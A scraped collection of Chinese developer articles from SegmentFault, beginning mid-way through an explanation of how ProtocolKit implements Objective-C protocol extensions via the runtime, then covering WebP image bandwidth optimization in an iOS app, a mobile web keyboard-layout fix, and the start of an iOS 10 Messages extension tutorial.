<p>ProtocolKit 使用了 <code>protocolsLoadingLock</code> 来保证静态变量 <code>allExtendedProtocols</code> 以及 <code>extendedProtcolCount</code> <code>extendedProtcolCapacity</code> 不会因为线程竞争导致问题：</p>
<ul>
<li><p><code>allExtendedProtocols</code> 用于保存所有的 <code>PKExtendedProtocol</code> 结构体</p></li>
<li><p>后面的两个变量确保数组不会越界，并在数组满的时候，将内存占用地址翻倍</p></li>
</ul>
<p>方法的后半部分会在静态变量中寻找或创建传入的 <code>protocol</code> 对应的 <code>PKExtendedProtocol</code> 结构体：</p>
<pre><code class=""objectivec"">size_t resultIndex = SIZE_T_MAX;
for (size_t index = 0; index &lt; extendedProtcolCount; ++index) {
    if (allExtendedProtocols[index].protocol == protocol) {
        resultIndex = index;
        break;
    }
}

if (resultIndex == SIZE_T_MAX) {
    allExtendedProtocols[extendedProtcolCount] = (PKExtendedProtocol){
        .protocol = protocol,
        .instanceMethods = NULL,
        .instanceMethodCount = 0,
        .classMethods = NULL,
        .classMethodCount = 0,
    };
    resultIndex = extendedProtcolCount;
    extendedProtcolCount++;
}

_pk_extension_merge(&amp;(allExtendedProtocols[resultIndex]), containerClass);</code></pre>
<p>这里调用的 <code>_pk_extension_merge</code> 方法非常重要，不过在介绍 <code>_pk_extension_merge</code> 之前，首先要了解一个用于保存协议扩展信息的私有结构体 <code>PKExtendedProtocol</code>：</p>
<pre><code class=""objectivec"">typedef struct {
    Protocol *__unsafe_unretained protocol;
    Method *instanceMethods;
    unsigned instanceMethodCount;
    Method *classMethods;
    unsigned classMethodCount;
} PKExtendedProtocol;</code></pre>
<p><code>PKExtendedProtocol</code> 结构体中保存了协议的指针、实例方法、类方法、实例方法数以及类方法数用于框架记录协议扩展的状态。</p>
<p>回到 <code>_pk_extension_merge</code> 方法，它会将新的扩展方法追加到 <code>PKExtendedProtocol</code> 结构体的数组 <code>instanceMethods</code> 以及 <code>classMethods</code> 中：</p>
<pre><code class=""objectivec"">void _pk_extension_merge(PKExtendedProtocol *extendedProtocol, Class containerClass) {
    // Instance methods
    unsigned appendingInstanceMethodCount = 0;
    Method *appendingInstanceMethods = class_copyMethodList(containerClass, &amp;appendingInstanceMethodCount);
    Method *mergedInstanceMethods = _pk_extension_create_merged(extendedProtocol-&gt;instanceMethods,
                                                                extendedProtocol-&gt;instanceMethodCount,
                                                                appendingInstanceMethods,
                                                                appendingInstanceMethodCount);
    free(extendedProtocol-&gt;instanceMethods);
    extendedProtocol-&gt;instanceMethods = mergedInstanceMethods;
    extendedProtocol-&gt;instanceMethodCount += appendingInstanceMethodCount;
    
    // Class methods
    ...
}</code></pre>
<blockquote><p>因为类方法的追加与实例方法几乎完全相同，所以上述代码省略了向结构体中的类方法追加方法的实现代码。</p></blockquote>
<p>实现中使用 <code>class_copyMethodList</code> 从 <code>containerClass</code> 拉出方法列表以及方法数量；通过 <code>_pk_extension_create_merged</code> 返回一个合并之后的方法列表，最后在更新结构体中的 <code>instanceMethods</code> 以及 <code>instanceMethodCount</code> 成员变量。</p>
<p><code>_pk_extension_create_merged</code> 只是重新 <code>malloc</code> 一块内存地址，然后使用 <code>memcpy</code> 将所有的方法都复制到了这块内存地址中，最后返回首地址：</p>
<pre><code class=""objectivec"">Method *_pk_extension_create_merged(Method *existMethods, unsigned existMethodCount, Method *appendingMethods, unsigned appendingMethodCount) {
    
    if (existMethodCount == 0) {
        return appendingMethods;
    }
    unsigned mergedMethodCount = existMethodCount + appendingMethodCount;
    Method *mergedMethods = malloc(mergedMethodCount * sizeof(Method));
    memcpy(mergedMethods, existMethods, existMethodCount * sizeof(Method));
    memcpy(mergedMethods + existMethodCount, appendingMethods, appendingMethodCount * sizeof(Method));
    return mergedMethods;
}</code></pre>
<p>这一节的代码从使用宏生成的类中抽取方法实现，然后以结构体的形式加载到内存中，等待之后的方法注入。</p>
<h4>注入方法实现</h4>
<p>注入方法的时间点在 main 函数执行之前议实现的注入并不是在 <code>+ load</code> 方法 <code>+ initialize</code> 方法调用时进行的，而是使用的编译器指令(compiler directive) <code>__attribute__((constructor))</code> 实现的：</p>
<pre><code class=""objectivec"">__attribute__((constructor)) static void _pk_extension_inject_entry(void);</code></pre>
<p>使用上述编译器指令的函数会在 shared library 加载的时候执行，也就是 main 函数之前，可以看 StackOverflow 上的这个问题 <a href=""http://stackoverflow.com/questions/2053029/how-exactly-does-attribute-constructor-work"" rel=""nofollow noreferrer"">How exactly does __attribute__((constructor)) work?</a>。</p>
<pre><code class=""objectivec"">__attribute__((constructor)) static void _pk_extension_inject_entry(void) {
    #1：加锁
    unsigned classCount = 0;
    Class *allClasses = objc_copyClassList(&amp;classCount);
    
    @autoreleasepool {
        for (unsigned protocolIndex = 0; protocolIndex &lt; extendedProtcolCount; ++protocolIndex) {
            PKExtendedProtocol extendedProtcol = allExtendedProtocols[protocolIndex];
            for (unsigned classIndex = 0; classIndex &lt; classCount; ++classIndex) {
                Class class = allClasses[classIndex];
                if (!class_conformsToProtocol(class, extendedProtcol.protocol)) {
                    continue;
                }
                _pk_extension_inject_class(class, extendedProtcol);
            }
        }
    }
    #2：解锁并释放 allClasses、allExtendedProtocols
}</code></pre>
<p><code>_pk_extension_inject_entry</code> 会在 main 执行之前遍历内存中的<strong>所有</strong> <code>Class</code>（整个遍历过程都是在一个自动释放池中进行的），如果某个类遵循了<code>allExtendedProtocols</code> 中的协议，调用 <code>_pk_extension_inject_class</code> 向类中注射（inject）方法实现：</p>
<pre><code class=""objectivec"">static void _pk_extension_inject_class(Class targetClass, PKExtendedProtocol extendedProtocol) {
    
    for (unsigned methodIndex = 0; methodIndex &lt; extendedProtocol.instanceMethodCount; ++methodIndex) {
        Method method = extendedProtocol.instanceMethods[methodIndex];
        SEL selector = method_getName(method);
        
        if (class_getInstanceMethod(targetClass, selector)) {
            continue;
        }
        
        IMP imp = method_getImplementation(method);
        const char *types = method_getTypeEncoding(method);
        class_addMethod(targetClass, selector, imp, types);
    }
    
    #1: 注射类方法
}</code></pre>
<p>如果类中没有实现该实例方法就会通过 runtime 中的 <code>class_addMethod</code> 注射该实例方法；而类方法的注射有些不同，因为类方法都是保存在元类中的，而一些类方法由于其特殊地位最好不要改变其原有实现，比如 <code>+ load</code> 和 <code>+ initialize</code> 这两个类方法就比较特殊，如果想要了解这两个方法的相关信息，可以在 <a>Reference</a> 中查看相关的信息。</p>
<pre><code class=""objectivec"">Class targetMetaClass = object_getClass(targetClass);
for (unsigned methodIndex = 0; methodIndex &lt; extendedProtocol.classMethodCount; ++methodIndex) {
    Method method = extendedProtocol.classMethods[methodIndex];
    SEL selector = method_getName(method);
    
    if (selector == @selector(load) || selector == @selector(initialize)) {
        continue;
    }
    if (class_getInstanceMethod(targetMetaClass, selector)) {
        continue;
    }
    
    IMP imp = method_getImplementation(method);
    const char *types = method_getTypeEncoding(method);
    class_addMethod(targetMetaClass, selector, imp, types);
}</code></pre>
<p>实现上的不同仅仅在获取元类、以及跳过 <code>+ load</code> 和 <code>+ initialize</code> 方法上。</p>
<h2>总结</h2>
<p>ProtocolKit 通过宏和 runtime 实现了类似协议扩展的功能，其实现代码总共也只有 200 多行，还是非常简洁的；在另一个叫做 <a href=""https://github.com/jspahrsummers/libextobjc"" rel=""nofollow noreferrer"">libextobjc</a> 的框架中也实现了类似的功能，有兴趣的读者可以查看 <a>EXTConcreteProtocol.h · libextobjc</a> 这个文件。</p>
<h2>Reference</h2>
<ul>
<li><p><a href=""https://developer.apple.com/library/ios/documentation/Swift/Conceptual/Swift%5C_Programming%5C_Language/Extensions.html#//apple%5C_ref/doc/uid/TP40014097-CH24-ID151"" rel=""nofollow noreferrer"">Protocols · Apple Doc</a></p></li>
<li><p><a href=""https://github.com/jspahrsummers/libextobjc/blob/master/extobjc/EXTConcreteProtocol.h"" rel=""nofollow noreferrer"">EXTConcreteProtocol.h · libextobjc</a></p></li>
<li><p><a href=""http://nshipster.com/__attribute__/"" rel=""nofollow noreferrer"">__attribute__ · NSHipster</a></p></li>
<li><p><a href=""https://github.com/Draveness/iOS-Source-Code-Analyze/blob/master/objc/"" rel=""nofollow noreferrer"">你真的了解 load 方法么？</a></p></li>
<li><p><a href=""https://github.com/Draveness/iOS-Source-Code-Analyze/blob/master/objc/"" rel=""nofollow noreferrer"">懒惰的 initialize 方法</a></p></li>
</ul>
<blockquote>
<p>Github Repo：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a></p>
<p>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p>
<p>原文链接：<a href=""http://draveness.me/protocol-extension/"" rel=""nofollow noreferrer"">http://draveness.me/protocol-...</a></p>
</blockquote>

                ", 如何在 Objective-C 中实现协议扩展,1531972007,517,1,382,1,1,https://segmentfault.com/a/1190000006260319
90,1,0,6,"
                    
<p>首先，这是一个基于具体业务的组件优化方案，我尽量把业务逻辑从代码中抽离出来，部分地方代码可能有删减。</p>
<p>现在这个方案是用于一个多图片的新闻类应用，粗略估计过，用户在浏览完第一页所有新闻（共48篇），会消耗流量达100M，其中98M为图片，这里值得优化的空间非常大。</p>
<p>针对这种情况，我们先后使用过的优化包含：wifi条件下预载所有文章、图片和js、css数据；重用所有已经下载的js、css和图片的缓存；后台图片的压缩。</p>
<p>后台压缩和WebP化依赖第三方多媒体处理服务器，已知比较好的国内服务有腾讯优图和七牛。这里我们采用的七牛的服务。</p>
<p>我们的后台通过七牛的图片压缩（包含质量和分辨率），我们将首页流量由100m减少到了80m，依然有极大的提升空间。因此客户端采用基于WebP的流量压缩方案，将流量由80m压缩到了20m，减少了75%！相对于最初的处理，流量减少了80%！（android大多数机型支持WebP animated，压缩能达到80%，但iOS的解码对于WebP animated图片支持并不好，经常会出现失败的情况，所以iOS最终压缩率取决于首页中gif图的个数和大小，实际测试结果，优化幅度大概60%-80%之间）</p>
<p>在准备做这项优化之前，查阅过很多资料，发现WebP适配的相关文章博客，都只是介绍简单的功能性适配，所以，并没有得到什么好的思路。</p>
<p>于是，在三周的时间里，我一直边测试边优化，在没有初步方案的情况下，一点点完成功能，最终整理代码，解耦组件，整理出一套效果非常理想，并且使用方便的解决方案。</p>
<h3>一、了解 WebP</h3>
<p>WebP，是一种同时提供了有损压缩与无损压缩的图片文件格式，是Google新推出的影像技术，它可让网页图档有效进行压缩，同时又不影响图片格式兼容与实际清晰度，进而让整体网页下载速度加快。</p>
<ul>
<li><p>WebP 无损压缩的图片可以比同样大小的 PNG 小 26%；</p></li>
<li><p>WebP 有损压缩的图片可以比同样大小的 JPEG 小 25-34%；</p></li>
<li><p>WebP 支持无损的透明图层通道，代价只需增加 22% 的字节存储空间；</p></li>
<li><p>WebP 有损透明图像可以比同样大小的 PNG 图像小3倍。</p></li>
</ul>
<p>WebP在Native支持方面上，早已比较成熟，据说淘宝客户端在两年前就使用了WebP（主要是Native使用），后来H5全面使用，WebView的WebP采用插件的方式支持。</p>
<p>在安卓上，WebP的支持是非常简单的，毕竟都是谷歌的东西，自己当然要支持，但是在iOS的WebKit内核（UIWebView和WKWebView）上，是不能直接支持的。不过最近传言macOS 10.12上的Safari有测试WebP的迹象，暂时还不太明朗。</p>
<h3>二、准备工作</h3>
<p>由于OS X不支持原生WebP解码，所以，可以先安装一个工具。推荐使用Homebrew，具体使用参考 <a href=""http://brew.sh/index_zh-cn.html"" rel=""nofollow noreferrer"">http://brew.sh/index_zh-cn.html</a></p>
<p>安装完成后，使用命令</p>
<pre><code>$brew install webp</code></pre>
<p>就可以安装libwebp了。</p>
<p>客户端方面，Native图片加载使用的SDWebImage，该组件直接支持WebP的解码。需要在将预编译宏’WebP’置为1，并在pod中引入’iOS-WebP’即可。</p>
<p>服务端方面，我们采用七牛图片服务器，默认传给客户端的参数是一张jpg或者png的图片链接，通过修改url的请求参数实现对WebP图片的获取。相关规则可以参考七牛开发文档。</p>
<h3>三、具体方案实现</h3>
<p>首先考虑，请求的webp图片是通过url参数拼接完成的，所以，需要对客户端内请求的所有图片URL做处理，必须全部命中。而且，将来的缓存也应基于此URL进行处理，所以，添加一个NSURL分类，URL的处理由这个分类统一处理，所有的URL替换最终都会指向这个分类中的方法，耦合度基本可以将至最低。</p>
<pre><code>@interface NSURL (ReplaceWebP)
- (NSURL *)qd_replaceToWebPURLWithScreenWidth;
- (NSString *)qd_defultWebPURLCacheKey;
- (BOOL)qd_isShouldReplaceImageFormat;
@end</code></pre>
<p>下面是替换URL和缓存key的核心处理代码</p>
<pre><code>static NSString * const qdHost = @""img.host.com"";
@implementation NSURL (ReplaceWebP)
- (NSString *)qd_defultWebPURLCacheKey {
    if (![self qd_isShouldReplaceImageFormat]) {
        return self.absoluteString;
    }
    NSString *key;
    if ([self isWebPURL]) {
        key = self.absoluteString;
    } else {
        key = [self qd_replaceToWebPURLWithScreenWidth].absoluteString;
    }
    return key;
}
- (NSURL *)qd_replaceToWebPURLWithImageWidth:(int)width {
  
    if ([self qd_isShouldReplaceImageFormat]) {
        NSString *urlStr;
        
        if ([self URLStringcontainFomartString:@""?""]) {
            if ([self URLStringcontainFomartString:@""format/jpg""]) {
                urlStr = [self.absoluteString stringByReplacingOccurrencesOfString:@""format/jpg"" withString:@""format/webp""];
            } else {
                NSString *suffixStr = @""imageView2/0/format/webp/ignore-error/1"";
                urlStr = [NSString stringWithFormat:@""%@/%@"", self.absoluteString, suffixStr];
            }
        } else {
            NSString *pathExtension = [[self.absoluteString.pathExtension componentsSeparatedByString:@""-""] firstObject];
            urlStr = [NSString stringWithFormat:@""%@.%@-WebPiOSW%d"",self.absoluteString.stringByDeletingPathExtension, pathExtension, width];
        }
        return [NSURL URLWithString:urlStr];
    }
    return self;
}
- (NSURL *)qd_replaceToWebPURLWithScreenWidth {
    
    int width = (int)([UIScreen mainScreen].bounds.size.width * [UIScreen mainScreen].scale);
    return [self qd_replaceToWebPURLWithImageWidth:(int)width];
}</code></pre>
<p>所有的URL替换，最终都会到 - (NSURL *)qd_replaceToWebPURLWithImageWidth:(int)width 这个方法中来</p>
<p>下面是条件过滤，确保100%命中所有需要替换的图片格式</p>
<pre><code>- (BOOL)isQDHost {
    NSString *nsModel = [UIDevice currentDevice].model;
    BOOL s_isiPad = [nsModel hasPrefix:@""iPad""];
    if (s_isiPad) return NO;
    return [self URLStringcontainFomartString:qdHost];
}
- (BOOL)qd_isShouldReplaceImageFormat {
    
    if (![self isQDHost]) {
        return NO;
    }
    if ([self isWebPURL]) {
        return NO;
    }
    NSArray *extensions = @[@"".jpg"", @"".jpeg"", @"".png""];
    for (NSString *extension in extensions) {
        if ([self.absoluteString.lowercaseString rangeOfString:extension options:NSCaseInsensitiveSearch].location != NSNotFound){
            return YES;
        }
    }
    return NO;
}
- (BOOL)URLStringcontainFomartString:(NSString *)string {
    return ([self.absoluteString.lowercaseString rangeOfString:string options:NSCaseInsensitiveSearch].location != NSNotFound);
}
- (BOOL)isWebPURL {
    return [self URLStringcontainFomartString:@""-webp""] || [self URLStringcontainFomartString:@""/webp""];
}
@end</code></pre>
<p>所以，替换URL这个功能，被完全抽离出来，之后的代码，只需要考虑具体逻辑的问题了。</p>
<p><strong>2. Native 图片请求替换</strong></p>
<p>Native图片加载使用的SDWebImage，首先需要理解SD的代码，确定是最终的图片下载是调用的哪个方法</p>
<pre><code>- (id &lt;SDWebImageOperation&gt;)downloadImageWithURL:(NSURL *)url
                                 options:(SDWebImageOptions)options
                                progress:(SDWebImageDownloaderProgressBlock)progressBlock
                               completed:(SDWebImageCompletionWithFinishedBlock)completedBlock</code></pre>
<p>所有的图片下载，最终都走到了这个方法中，所以，替换URL应该在这个方法的最前面实现。</p>
<pre><code>{
    if ([url isKindOfClass:NSString.class]) {
        url = [NSURL URLWithString:(NSString *)url];
    }
    if (![url isKindOfClass:NSURL.class]) {
        url = nil;
    }
    url = [url qd_replaceToWebPURLWithScreenWidth];
    ...
    ...
}</code></pre>
<p>由于在评估了难度之后，我们果断地把SDWebImage从Pods中移除，手动添加一个子工程，这样可以比较方便地修改内部实现，而不至于用swizzling这种黑魔法来修改传入参数。这个技能虽然炫酷，然而很多情况下，杀敌一万，自损两万，不建议经常使用。</p>
<p>因修改了url值，若在上层通过SDImageCache判断是否有本地缓存时，也需要对url先做qd_defultWebPURLCacheKey来获取其真实缓存的key。这一部分比较简单。</p>
<p><strong>3. WebView 图片请求替换</strong></p>
<p>这一部分是这个方案的难度所在。</p>
<p>webkit内核现在都不支持解析WebP格式的图片，这里主要采用的iOS系统的NSURLProtocol来替换其网络请求（不了解NSURLProtocol，可以动动自己勤劳的小手Google一下），再将网络回包数据进行转码成jpg或者png（为了透明度），再返回给webview进行渲染的。</p>
<p>友情链接，<a href=""https://segmentfault.com/a/1190000006601382"" rel=""nofollow noreferrer"">NSURLProtocol用法，大神文章</a></p>
<p>同样的，iOS在此处依然不对gif进行任何处理。</p>
<p>另外，NSURLProtocol会拦截全局的网络流量，为避免误伤，这里需要单独识别是否是WebView发起的请求，可以通过识别request中的UA是否包含”AppleWebKit”来实现。</p>
<pre><code>@implementation QDWebURLProtocol
+ (BOOL)canInitWithRequest:(NSURLRequest *)request {
    
    NSString *ua = [request valueForHTTPHeaderField:@""User-Agent""];
    if ([request.URL qd_isShouldReplaceImageFormat] &amp;&amp; [ua lf_containsSubString:@""AppleWebKit""]) {
        return YES;
    }
}</code></pre>
<p>这里可以接管所有WebView中需要替换的图片URL。</p>
<p>下面，会自动调用startLoading方法，这里采用了一个非常特别的方式处理</p>
<pre><code>- (void)startLoading {
    if ([self.request.URL qd_isShouldReplaceImageFormat]) {
        [[SDWebImageManager sharedManager] downloadImageWithURL:self.request.URL
                                                        options:0
                                                       progress:nil
                                                      completed:^(UIImage *image, NSError *error, SDImageCacheType cacheType, BOOL finished, NSURL *imageURL)
                                                    {
                                                          NSData *data;
                                                          if ([imageURL.absoluteString.lowercaseString lf_containsSubString:@"".png""]) {
                                                              data = UIImagePNGRepresentation(image);
                                                          } else {
                                                              data = UIImageJPEGRepresentation(image, 1);
                                                          }
                                                          [self.client URLProtocol:self didLoadData:data];
                                                          [self.client URLProtocolDidFinishLoading:self];
                                                      }];
        return;
    }
    self.connection = [NSURLConnection connectionWithRequest:self.request delegate:self];
}</code></pre>
<p>是不是很奇特，由SDWebImageManager直接接管图片请求，手动finishLoading。</p>
<p>首先需要明确，WebP节约流量，究竟是怎么样的原理：</p>
<p>所谓图片格式，是采用何种解码编码方式决定的，所有数据最终一定是变成二进制数据，NSData；<br>既然UIWebView不支持解码WebP，我们可以让图片在网络中以WebP格式的NSData传递，本地收到data后，解码成UIWebView可以识别的UIImage；事实上，Native方面就是这么做就可以达到目标了，然而在WebView的请求中，无论我们本地做了何种处理，最终交给WebView的也一定是NSData，所以，需要再把UIImage编码成jpg或者png（之所以我们没有把gif也转WebP，就是因为从WebP的动图UIImage，转码成NSData这条路走不通，于是我们放弃了gif转WebP）。</p>
<p>所以，大致的数据路径如下：</p>
<blockquote><p>本地发送WebP请求 ---&gt; Server ---&gt; 返回WebP格式Data ---&gt; Data经谷歌的WebP decode得到UIImage ---&gt; 将UIImage对象编码成JPG或PNG格式NSData ---&gt; 替换本应交给WebView的WebP格式Data ---&gt; WebView接收JPG或PNG格式Data ---&gt; 渲染图片</p></blockquote>
<p>在最开始，这里并不是这么写的，当时是在系统的</p>
<pre><code>- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data
</code></pre>
<p>方法中转码处理。按这个思路写，代码越写越散，BUG也越来越多。所以，换了个思路，既然SD可以支持WebP，为什么不用他来全面托管呢？</p>
<p>这样的话，原生请求和WebView的图片缓存也可以经由SD统一起来，所以，这应该是一个好的方案。</p>
<p>这样的话，WebP的所有请求都已经可以处理（wifi预加载暂时不管，因为是自己写的downloader，替换URL后直接改把缓存指向修改就可以），之后要处理缓存的问题</p>
<p><strong>4. 图片缓存处理</strong></p>
<p>以前的代码已经实现了内部文章的缓存，包含js、css以及image等。这里通过NSURLCache来实现。相应的，基于WebP的图片缓存的读取也应该在NSURLCache中处理，在先处理完URL后，用新的Key来进行映射。</p>
<p>这里建议所有基于WebView的流量优化都最好用UA的判断包住，避免带来问题。因为无论NSURLProtocol还是NSURLCache都是全局网络控制。</p>
<p>篇幅略长，具体缓存处理放在下一篇介绍。</p>

                ", iOS 客户端基于 WebP 图片格式的流量优化（上）,1531972009,386,1,395,1,1,https://segmentfault.com/a/1190000006266276
91,1,0,6,"
                    
<h2>问题概述</h2>
<blockquote><p>问题1：H5 web 移动端 输入框, 键盘唤起后fixed定位好的元素跟随页面滚动了起来… <strong>fixed属性失效</strong>了！满屏任性横飞, 如下图:</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/bVAmvA?w=1080&amp;h=1920"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<blockquote><p>问题2：有第三方输入法的ios机还会出现键盘弹出延迟，导致普通布局 输入框(input/textarea等) 位置靠下的被键盘挡住, 如下图:</p></blockquote>
<p>(这个'完成'出来, 然后'键盘'再顶起)</p>
<p><span class=""img-wrap""><img data-src=""/img/bVAmxI?w=719&amp;h=1280"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<h2>2016-11-04完美解决方案</h2>
<pre><code>// CSS
.scrollWrapper {
    position: absolute;
    left: 0;
    right: 0;
    bottom: 0;
    top:0;
}
bottomInput {
    position: absolute;
    bottom:0;
    left:0;
    right: 0;
}

// HTML
&lt;body&gt;
    &lt;div class=""scrollWrapper""&gt;
        &lt;div class=""bottomInput""&gt;
            &lt;input type=""text"" placeholder=""input""/&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;

// javascript
// 在输入框获取焦点, 键盘弹起后, 真的是一行代码
var interval = setInterval(function() {
    document.body.scrollTop = document.body.scrollHeight
}, 100)</code></pre>
<hr>
<h2>
<strong>注意:</strong> 下面解决ios键盘问题的是之前的旧方法, 还是有瑕疵, 可跳过看其他</h2>
<h2>解决思路</h2>
<h3>问题1:</h3>
<ul><li><p>不让页面整体滚动, 绝对布局滚动内容, 局部滚动.</p></li></ul>
<h3>问题2:</h3>
<ol>
<li><p>键盘完全弹出时, <strong>判断键盘是否在可视区域</strong>(即屏幕除去键盘占用的区域)</p></li>
<li><p>通过js来调整输入框的位置;</p></li>
<li><p>键盘完全收起后, 调整键盘到页面底部;</p></li>
</ol>
<h2>相关代码</h2>
<h3>问题1:</h3>
<pre><code class=""html"">// HTML
&lt;body&gt; 
    &lt;!-- 可以滚动的区域 --&gt;
    &lt;main className='scrollWrapper'&gt;
        &lt;!-- 内容在这里... --&gt;
    &lt;/main&gt;
    
    &lt;!-- fixed定位在底部的输入框 --&gt;
    &lt;footer&gt;
       &lt;div className='inputBox' contenteditable='true' placeholder='请输入评论'&gt;&lt;/div&gt;
    &lt;/footer&gt;
&lt;/body&gt;</code></pre>
<pre><code class=""css"">// CSS
.scrollWrapper {
    position: absolute;/* 绝对定位，进行内部滚动 */
    left: 0;
    right: 0;
    top: 0;
    bottom: 0;
    overflow-y: atuo;/* 或者scroll */
    -webkit-overflow-scrolling: touch;/* 解决ios滑动不流畅问题 */
}
footer {
    position: fixed;
}</code></pre>
<h3>问题2:</h3>
<p>原因如下面两张图所示, 其实稍微注意一下, 可以看到原生输入法比第三方输入法少了一个tool bar, 就是这个罪魁祸首:</p>
<p><span class=""img-wrap""><img data-src=""/img/bVAnRl?w=955&amp;h=339"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code class=""javascript"">     // 输入框获取焦点, 键盘完全弹出再调整输入框位置(因ios键盘弹出不会触发resize事件, 故延时600ms)
     // 选择setInterval轮询几次更好
     setTimeout(() =&gt; {
        // 挂载this上, 或者声明一个全局变量, 用于在失去焦点时, 要不要执行调整代码(非第三方不调整)
        this.inputIsNotInView = this.notInView()
        
        if (this.inputIsNotInView) {
            // Width, Height: 分别是键盘没有弹出时window.innerWidth和window.innerHeight
            // 88: 是第三方输入法比原生输入法多的那个tool bar(输入时显示带选项) 的高度, 做的不是太绝, 高度是统一的
            // ios第三方输入法的tool bar 甚至 键盘也被当作可视区域了(包含在键盘弹出时的window.innerHeight)
            if (Width != 750) {
                let bottomAdjust = (Height - window.innerHeight - 88) + 'px'
                $(this.inputBoxContainer).css('bottom', bottomAdjust)
            }
            else {
                // 'iphone 6 6s, 需要额外减去键盘高度432(见下图), 还算有良心, 高度和原生保持一致')
                let bottomAdjust = (Height - window.innerHeight - 88 - 432) + 'px'
                $(this.inputBoxContainer).css('bottom', bottomAdjust)
            }
        }
    }, 600)

--------------------------------------------------------------------------------------
   
    // 失去焦点, 键盘开始收起, 隐藏inputBox; 等键盘完全收起, 再显示inputBox, 设置在底部, 避免闪跳
    if (this.inputIsNotInView) {
        // display和opacity + bottom 会有闪跳
        $(this.inputBoxContainer).css({ 'opacity': 0, bottom: 0 })
        setTimeout(() =&gt; {
            $(this.inputBoxContainer).css('opacity', 1)
        }, 600)
    }

--------------------------------------------------------------------------------------
    //判断元素是否在可视区域，不在的话返回true, 在返回false
    notInView() {
        // getBoundingClientRect 是获取定位的，很怪异, (iphone 6s 10.0 bate版表现特殊)
        // top: 元素顶部到窗口（可是区域）顶部
        // bottom: 元素底部到窗口顶部
        // left: 元素左侧到窗口左侧
        // right: 元素右侧到窗口左侧
        // width/height 元素宽高
           let bottom = this.inputBoxContainer.getBoundingClientRect().bottom
           
           // 可视区域高度 - 元素底部到窗口顶部的高度 &lt; 0, 则说明被键盘挡住了
        if (window.innerHeight - bottom &lt; 0) {
            return true
        }
        return false
    }</code></pre>
<p>iphone 6 和 6s 奇葩现象</p>
<p><span class=""img-wrap""><img data-src=""/img/bVAmEN?w=784&amp;h=1228"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<h3>部分低端android机, 键盘收起后, 键盘区域显示空白, 需重新设置height, 如图:</h3>
<p><span class=""img-wrap""><img data-src=""/img/bVAmAK?w=816&amp;h=1300"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<pre><code class=""javascript"">    // android, 键盘弹起/收回会触发resize事件
    window.onresize = function () {
        // Height: 键盘没有弹出时window.innerHeight
        if (Height == window.innerHeight) {
            $(this.scrollWrapper).css('height', window.innerHeight + 'px')
        }
    }
</code></pre>
<h2>另外需要注意的是</h2>
<ol>
<li><p>js拿不到键盘的 弹起/收起 事件;</p></li>
<li><p>ios上键盘 弹起/收回 不会触发window.resize事件;</p></li>
<li><p>android 4.4 以下, 键盘唤起时, 不仅会触发resize, 而且会触发scroll事件;<br>   (如果有需要滑动失去焦点这个需求, 选择touchMove, 不要选择scroll)</p></li>
<li><p>ios之所以会遮挡输入框, 是因为, 第三方输入法的tool bar 或者 键盘也被当做可视区域了(包含在键盘弹出时的window.innerHeight)</p></li>
</ol>
<h2>总结</h2>
<blockquote><p>最后建议(ios已经完美解决, 此建议可酌情忽略了), 类似这种需求,尽量不要放在屏幕下50%</p></blockquote>
<ol>
<li><p>转场输入评论, 微博等;</p></li>
<li><p>弹窗到可视区域上50%区域, 3G门户;</p></li>
</ol>
<p><span class=""img-wrap""><img data-src=""/img/bVAmCj?w=720&amp;h=1280"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>

                ", (2016-11-04完美解决)移动端iOS第三方输入法遮挡底部input及android键盘回落后留白问题,1531972011,580,1,806,1,1,https://segmentfault.com/a/1190000006243816
92,1,0,6,"
                    
<p><em>本文介绍了 iOS 10 的一个重要更新：Messages 应用支持第三方插件了。作者用一个小游戏作为例子，说明了插件开发从建工程开始，到绘制界面、收发消息的全过程。</em></p>
<blockquote>
<p>《iOS 10 day by day》是 <a href=""https://www.shinobicontrols.com/"" rel=""nofollow noreferrer"">shinobicontrols</a> 公司编写的系列博客，介绍开发者需要了解的 iOS 10 新特性，每周更新。本系列翻译（<a href=""http://www.jianshu.com/notebooks/5278512/latest"" rel=""nofollow noreferrer"">文集地址</a>）已取得官方授权。仓薯翻译，欢迎指正：）</p>
<p>Shinobicontrols 为 iOS 和 Android 开发者提供高性能、响应式的 UI 控件 SDK，尤其是图表方面的控件。 官网 : <a href=""https://www.shinobicontrols.com/"" rel=""nofollow noreferrer"">shinobicontrols.com</a>  twitter : <a href=""https://twitter.com/shinobicontrols"" rel=""nofollow noreferrer"">@shinobicontrols</a></p>
</blockquote>
<p>苹果官方的 Messages 在 iOS 10 推出了<strong>非常重大</strong>的更新，可能主要是想从其他 IM 巨头手里抢点市场份额回来，包括 Facebook Messenger, Wechat 和 Snapchat。</p>
<p>一个重要的新功能是，用户可以直接在 Messages 里使用第三方开发者开发的扩展插件了。这个功能是在 iOS 8 引入的 Extension 技术基础上实现的，可以参考我们往年系列里 <a href=""https://www.shinobicontrols.com/blog/ios8-day-by-day-day-2-sharing-extension"" rel=""nofollow noreferrer"">Sam Davies 写的文章</a>。Messages 插件的一大好处是，它是可以独立于 app 存在的，不用跟父 app 打包在一起。今年晚些时候 iOS 10 将会发布一个小巧的 Messages App Store，里面会有一堆插件供用户挑选。</p>
